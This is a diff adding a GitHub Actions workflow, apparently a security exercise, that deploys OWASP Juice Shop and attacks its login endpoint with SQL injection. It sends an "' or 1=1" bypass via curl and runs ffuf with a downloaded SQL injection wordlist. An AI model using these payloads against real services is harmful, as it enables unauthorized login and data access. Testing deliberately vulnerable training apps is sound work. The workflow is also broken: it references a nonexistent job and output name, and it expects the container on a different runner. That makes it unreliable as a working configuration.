@@ -1,0 +1,87 @@
+name: MyFuzzing
+
+on:
+  push:
+  workflow_dispatch:
+
+permissions:
+  contents: write
+  pull-requests: write
+  security-events: write
+  actions: read
+
+jobs:
+
+  deploy-juice: #start and check juice 
+    name: Deploy Juice
+    runs-on: ubuntu-latest
+    outputs:
+      app-url: ${{ steps.set-url.outputs.URL }}
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Run JuiceShop in docker
+        run: |
+          docker run -d -p 3000:3000 --name juice-shop bkimminich/juice-shop
+          # Ждем, пока поднимется
+          sleep 10
+      - name: Set App URL
+        id: set-url
+        run: echo "URL=http://localhost:3000" >> $GITHUB_OUTPUT
+
+    
+
+  ffuf:
+    name: ffuf scanning
+    needs: deploy-juice
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Wait for service
+        run: |
+            sleep 10 
+            mkdir -p artifacts
+            curl -o artifacts/curlRes.json --path-as-is -i -s -k -X $'POST' \
+              -H $'Host: localhost:3000' -H $'Content-Length: 43' -H $'Content-Type: application/json' -H $'Connection: keep-alive' \
+              --data-binary $'{\"email\":\"\' or 1=1 -- -\",\"password\":\"pass\"}' \
+              ${{ needs.deploy.outputs.app_url }}/rest/user/login
+      - name: Install fuzzing
+        run: |
+          go install github.com/ffuf/ffuf/v2@latest
+          echo "$HOME/go/bin" >> $GITHUB_PATH
+
+      - name: Get payloads
+        run: |
+          mkdir payloads
+          wget -O payloads/sqli.txt https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/SQL%20Injection/Intruder/SQL-Injection
+      
+
+      - name: Run ffuf login (email)
+        run: |
+          mkdir -p artifacts
+          ffuf -w payloads/sqli.txt \
+              -u ${{ needs.deploy.outputs.app_url }}/rest/user/login \
+              -X POST \
+              -H 'Content-Type: application/json' \
+              -d '{"email":"FUZZ","password":"pass"}' \
+              -mc 200 \
+              -o artifacts/ffuf.json
+
+      - name: Save sample response diff 
+        run: |
+          jq '.results[:20]' artifacts/ffuf.json > artifacts/top_results.json
+
+      
+
+      - name: Get Logs from Service(docker)
+        run: |
+          docker logs $(docker ps -q --filter ancestor=bkimminich/juice-shop) > artifacts/juice-logs.log
+
+      
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: security-reports-bundle
+          path: artifacts/
